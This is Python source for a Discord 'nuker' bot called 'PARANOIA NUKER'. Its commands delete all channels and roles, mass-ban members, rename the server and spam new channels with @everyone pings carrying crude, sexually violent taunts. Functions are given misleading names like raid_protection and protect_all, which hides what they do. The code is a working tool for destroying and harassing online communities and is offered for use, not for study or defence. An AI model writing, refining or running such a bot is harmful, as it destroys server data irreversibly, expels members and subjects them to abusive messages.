import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True 

# Set up bot with command prefix
bot = commands.Bot(command_prefix=".", intents=intents)

async def is_admin(ctx):
    return ctx.author.guild_permissions.manage_channels

@bot.command(name='kill')
@commands.check(is_admin) 
async def raid_protection(ctx):

    await ctx.send("raping the server!")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.Forbidden:
            print(f"Permission denied to delete channel: {channel.name}")
        except discord.HTTPException as e:
            print(f"Failed to delete channel {channel.name} due to: {e}")

    await ctx.guild.edit(name="PARANOIA ON TOP | PARANOIA NUKER")
    await ctx.send("Server renamed to 'PARANOIA ON TOP | PARANOIA NUKER'.")

    await ctx.send("Creating 30 new channels...")
    for i in range(30):
        await ctx.guild.create_text_channel(f"raid-channel-{i + 1}")
        print(f"Created channel: raid-channel-{i + 1}")

    await ctx.send("channels created")

@bot.command(name='roles')
@commands.check(is_admin)
async def remove_roles(ctx):

    await ctx.send("Bulk deleting all roles... This action is irreversible!")
    for role in ctx.guild.roles:
        if role.name != "@everyone": 
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
            except discord.Forbidden:
                print(f"Permission denied to delete role: {role.name}")
            except discord.HTTPException as e:
                print(f"Failed to delete role {role.name} due to: {e}")
    
    await ctx.send("all roles (except @everyone) have been deleted!")


@bot.command(name='ban')
@commands.check(is_admin) 
async def protect_all(ctx):

    await ctx.send("banning all members...")
    bot_role = ctx.guild.get_member(bot.user.id).top_role
    for member in ctx.guild.members:
        if member != ctx.guild.owner and member.top_role < bot_role: 
            try:
                await member.ban(reason="banning all members")
                print(f"Banned user: {member.name}")
            except discord.Forbidden:
                print(f"Permission denied to ban user: {member.name}")
            except discord.HTTPException as e:
                print(f"Failed to ban user {member.name} due to: {e}")
    
    await ctx.send("all members banned")


@bot.command(name='ping')
@commands.check(is_admin)
async def mass_ping(ctx):
    await ctx.send("creating channels...")

    for i in range(10):
        channel = await ctx.guild.create_text_channel(f"fucked-by-paranoia-{i + 1}")
        await channel.send(f"@everyone SERVER RAPED BY PARANOIA NUKER")

    await ctx.send("channels created.")

@bot.command(name='rename')
@commands.check(is_admin)
async def rename_server(ctx):
    await ctx.guild.edit(name="PARANOIA ON TOP | FUCKED BY PARANOIA")
    await ctx.send("name change was successful.")

bot.run('YOURTOKENHERE') # replace 'YOURTOKENHERE' with your actual bot token
